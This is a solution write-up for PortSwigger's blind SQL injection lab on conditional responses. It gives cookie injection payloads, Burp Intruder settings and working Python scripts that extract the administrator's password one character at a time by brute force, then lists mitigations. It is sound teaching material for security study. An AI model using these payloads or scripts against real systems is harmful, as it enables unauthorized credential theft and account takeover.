# 🧪 Lab 11: Blind SQL Injection with Conditional Responses Solution

**PortSwigger Lab Link:** [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

**Table of Contents:**
* 1. Lab Description
* 2. Vulnerability
* 3. Exploitation Steps
* 4. Key Learnings/Concepts
* 5. Mitigation

---

## 1. Lab Description

This lab introduces **Blind SQL Injection**, a type of SQL injection where the application's response does not directly reveal database errors or data. Instead, information is inferred based on **conditional responses** from the server. The objective is to exploit this vulnerability, found in a **cookie (TrackingId)**, to **dump the administrator's password** and log in. The success of the injection is indicated by a "Welcome back" message on the page if the injected condition is true, and no message (or a different message) if it's false.

---

## 2. Vulnerability

The vulnerability is **Blind SQL Injection**, specifically relying on **conditional responses (Boolean-based Blind SQLi)**. This occurs when the application constructs an SQL query using user-supplied input (in this case, from the `TrackingId` cookie) without proper sanitization, but the results of the query are not directly returned to the user.

Instead, the application's behavior or a subtle change in its response (like the presence or absence of a "Welcome back" message) indicates whether a certain injected condition is true or false. This allows an attacker to infer information character by character, or bit by bit, by asking a series of true/false questions to the database. This method is more time-consuming than error-based or UNION-based SQLi but is effective when no direct data output is available.

---

## 3. Exploitation Steps

### 🔹 Step 1: Intercept Request and Identify Injection Point

1.  Open the lab in your web browser.
2.  Ensure Burp Suite is intercepting traffic.
3.  Load the page. Observe the request in Burp Proxy.
4.  Notice the `TrackingId` cookie in the request header. This is our suspected injection point.
5.  Send the request to **Repeater**.

### 🔹 Step 2: Confirm Blind SQL Injection and Conditional Response

We need to confirm that the `TrackingId` cookie is vulnerable and how the application responds to true/false conditions.

1.  In Burp Repeater, modify the `TrackingId` cookie value by appending an SQL condition:
    * **Test 1 (True Condition):**
        Set `Cookie: TrackingId=xyz' AND 1=1--`
        (Replace `xyz` with the original cookie value's prefix, e.g., `0987abc`).
    * Send the request.
    * 📌 **Expected Result:** The page should display the "Welcome back" message because `1=1` is true.

    * **Test 2 (False Condition):**
        Set `Cookie: TrackingId=xyz' AND 1=2--`
    * Send the request.
    * 📌 **Expected Result:** The "Welcome back" message should *not* be displayed because `1=2` is false.

    This confirms the presence of Boolean-based Blind SQL Injection and establishes our true/false indicator ("Welcome back" message).

### 🔹 Step 3: Determine Password Length

To dump the password, we first need to know its length. We can use the `LENGTH()` SQL function combined with a conditional check.

1.  **Formulate the Payload:** We will check the length of the administrator's password character by character. The payload will look like:
    `' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = N--`
    where `N` is our guessed length.

2.  **Using Burp Intruder (Recommended for Brute-forcing Length):**
    * Send the request from Repeater to **Intruder**.
    * Set the attack type to **Sniper**.
    * Define the payload position: Place `§N§` where `N` is in the payload (e.g., `Cookie: TrackingId=xyz' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = §N§--`).
    * Go to **Payloads**.
    * Set **Payload type** to **Numbers**.
    * Set **From:** `1`, **To:** `100` (or a reasonable upper limit for password length), **Step:** `1`.
    * Go to **Options -> Grep - Match**. Clear any existing "Grep - Match" items.
    * **Add a new "Grep - Match" item for the "Welcome back" string.** (This tells Intruder to note when this string appears in the response).
    * Start the attack.
    * 📌 **Observe the results:** Look for the request where the "Welcome back" string appeared. The payload number for that request will be the password's length.
    * **In this lab, you should find the password length is 20 characters.**

3.  **Alternatively, using Python (More automated):**
    You can write a simple Python script to automate this.

    ```python
    import requests

    # Base URL of the lab
    url = "YOUR_LAB_URL_HERE" # e.g., '[https://0a540000000000000000000000000000.web-security-academy.net/filter?category=Lifestyle](https://0a540000000000000000000000000000.web-security-academy.net/filter?category=Lifestyle)'
    # Base cookie value (replace with what you observe in Burp)
    base_cookie = "TrackingId=YOUR_BASE_TRACKING_ID; session=YOUR_SESSION_ID" # e.g., "TrackingId=0987abc; session=0123xyz"

    def get_length():
        print("Finding password length...")
        for i in range(1, 101): # Check lengths from 1 to 100
            payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}--"
            
            # Construct the cookie with the payload
            cookie = {'TrackingId': base_cookie.split(';')[0].split('=')[1] + payload, 
                      'session': base_cookie.split(';')[1].split('=')[1]}
            
            r = requests.get(url, cookies=cookie)
            if "Welcome back" in r.text:
                print(f"Password Length: {i}")
                return i
        print("Could not determine password length.")
        return None

    password_length = get_length()
    ```

### 🔹 Step 4: Extract Password Characters One by One

Now that we know the password length (e.g., 20), we need to extract each character. We'll use the `SUBSTRING()` SQL function (or similar, like `SUBSTR()` for Oracle/PostgreSQL) and compare each character against a known character set.

1.  **Character Set:** Define a set of possible characters (alphanumeric, special characters).
    * E.g., `abcdefghijklmnopqrstuvwxyz0123456789`

2.  **Formulate the Payload:**
    `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), I, 1) = 'C'--`
    where:
    * `I`: is the position of the character we're guessing (from 1 to `password_length`).
    * `C`: is the guessed character.

3.  **Using Burp Intruder (Recommended for Brute-forcing Characters):**
    * Send the request from Repeater to **Intruder**.
    * Set the attack type to **Cluster Bomb** (because we have two variable positions: character index `I` and guessed character `C`).
    * Define two payload positions:
        * `§I§`: for the character index.
        * `§C§`: for the guessed character.
        * Example: `Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), §I§, 1) = '§C§'--`
    * Go to **Payloads**.
    * **Payload Set 1 (for `§I§` - Character Position):**
        * **Payload type:** Numbers
        * **From:** `1`, **To:** `password_length` (e.g., `20`), **Step:** `1`.
    * **Payload Set 2 (for `§C§` - Guessed Character):**
        * **Payload type:** Brute forcer (or Character set, if you define one)
        * **Character set:** `abcdefghijklmnopqrstuvwxyz0123456789` (or a more comprehensive set if needed).
        * **Min length:** `1`, **Max length:** `1`.
    * Go to **Options -> Grep - Match**.
    * Ensure `Welcome back` is still added as a "Grep - Match" item.
    * Start the attack.
    * 📌 **Observe results:** The results table will show combinations of `I` and `C`. Sort by the presence of "Welcome back". For each position `I`, there will be exactly one `C` that yielded a "Welcome back" response. Record these characters in order to reconstruct the password.

4.  **Alternatively, using Python (More automated):**
    ```python
    import requests

    # (Assume url, base_cookie, and password_length are defined from previous step)

    characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;':\",.<>/?`~" # Comprehensive character set

    def get_data(length):
        print("Dumping Data... Please wait.")
        dumped_password = ""
        for i in range(1, length + 1): # Iterate through each character position
            for char in characters:
                # Payload for guessing each character
                # Note: Substring index starts from 1 in SQL, not 0 like Python
                payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{char}'--"
                
                # Construct the cookie
                cookie = {'TrackingId': base_cookie.split(';')[0].split('=')[1] + payload, 
                          'session': base_cookie.split(';')[1].split('=')[1]}
                
                r = requests.get(url, cookies=cookie)
                
                if "Welcome back" in r.text:
                    dumped_password += char
                    print(f"\rPassword: {dumped_password}", end="") # Print progressively
                    break # Move to next character position
        print(f"\nGot it! Password: {dumped_password}")
        return dumped_password

    # Assuming password_length has been determined from get_length()
    # password_length = get_length()
    # if password_length:
    #     admin_password = get_data(password_length)
    #     print(f"Final Administrator Password: {admin_password}")
    #     # You would then manually log in with this password
    ```

### 🔹 Step 5: Log In and Solve the Lab

1.  Once you have successfully extracted the administrator's password, navigate to the application's login page.
2.  Use the username `administrator` and the extracted password to log in.
3.  Upon successful login, the lab will be marked as solved.

---

## 4. Key Learnings/Concepts

* **Blind SQL Injection (Boolean-based):** Understanding that SQL injection can occur even when no direct database output or error messages are returned. Information is inferred based on a detectable difference in the application's response (e.g., page content, HTTP status code, page load time).
* **Conditional Payloads:** Crafting SQL conditions (`AND 1=1`, `AND 1=2`) to test truth values and elicit different application responses.
* **Information Gathering in Blind SQLi:**
    * **Length Determination:** Using functions like `LENGTH()` to find the length of sensitive strings (e.g., password length).
    * **Character Extraction:** Using string manipulation functions like `SUBSTRING()` (or `SUBSTR()`, `MID()`) to extract individual characters from a string.
* **Brute-Forcing/Automated Enumeration:** Recognizing that blind SQLi often requires systematically testing many possibilities (characters, positions). This is where tools like Burp Intruder or custom Python scripts become essential for automation.
* **Character Sets:** Understanding the need to define a comprehensive character set when brute-forcing characters to ensure all possible characters are covered.
* **HTTP Indicators:** Paying close attention to subtle changes in HTTP responses (e.g., a specific phrase in the HTML body, or even response length/time) that act as an oracle for your SQL queries.

---

## 5. Mitigation

Blind SQL Injection vulnerabilities are prevented by the same core principles as other SQL Injection types:

* **Parameterized Queries (Prepared Statements):** This remains the most effective defense. By using placeholders for user-supplied data, the database engine treats input as data, not as executable code, preventing any malicious SQL from altering the query logic.
* **Strong Input Validation:** Implement strict validation on all user inputs (including cookies, headers, and form fields) to ensure they conform to expected formats and types. Reject any input that deviates from the norm.
* **Least Privilege Principle:** Database accounts used by the application should have only the minimum necessary permissions. This limits the scope of damage an attacker can inflict even if an injection occurs (e.g., preventing access to sensitive tables like `users`).
* **Secure Error Handling & Generic Responses:** Avoid displaying any detailed error messages or direct database information in the application's responses. Present generic error messages to users. Even seemingly innocuous "Welcome back" messages (as in this lab) can become an oracle in blind injection scenarios.
* **Web Application Firewalls (WAFs):** A WAF can provide an additional layer of defense by detecting and blocking common blind SQL injection patterns and payloads, though it should not be the sole defense.
* **Database Hardening:** Regularly patch and securely configure the database server. Disable unnecessary features and services that could expose information.
